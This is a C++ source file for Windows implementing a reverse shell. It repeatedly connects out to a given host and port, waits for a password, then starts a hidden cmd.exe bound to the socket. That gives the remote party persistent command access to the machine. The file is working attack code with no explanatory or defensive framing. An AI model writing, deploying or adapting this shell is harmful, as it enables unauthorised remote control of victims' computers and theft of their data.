// reverseShell.cpp : Defines the entry point for the console application.
//



#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "reverseShell.h"

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


int connect(char *host, int port) 
{


    WSADATA wsaData;
    char recvbuf[512];
    int recvbuflen = 512;

    // Connect to server.
    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(host);
    clientService.sin_port = htons(port);
	printf("[*] connecting to %s:%d",host,port);

    STARTUPINFO startupInfo;
    ZeroMemory( &startupInfo, sizeof(startupInfo) );
    startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    startupInfo.cb = sizeof(_STARTUPINFOW);

    PROCESS_INFORMATION processInformation;
    ZeroMemory( &processInformation, sizeof(processInformation) );
    LPWSTR szCmdline = _wcsdup(L"cmd");
    char* pass = PASSWORD;

    // Initialize Winsock
    int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);

    while(true)
	{

        // Create a SOCKET for connecting to server
        SOCKET ConnectSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

        startupInfo.hStdInput = (HANDLE) ConnectSocket;
        startupInfo.hStdError = (HANDLE) ConnectSocket;
        startupInfo.hStdOutput = (HANDLE) ConnectSocket;

        iResult = connect( ConnectSocket, (sockaddr *) &clientService, sizeof(clientService));
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);

        if (iResult != -1)
		{
            printf("%d\n", iResult);
        }

        if (iResult == (strlen(pass) + 1) && strncmp(recvbuf, pass, strlen(pass)) == 0)
		{
            BOOL res = CreateProcess(0, szCmdline, 0, 0, TRUE, CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS, 0, 0, &startupInfo, &processInformation);
            DWORD reswait = WaitForSingleObject(processInformation.hProcess, INFINITE);
        }
        closesocket(ConnectSocket);
    }


	return 0;
}

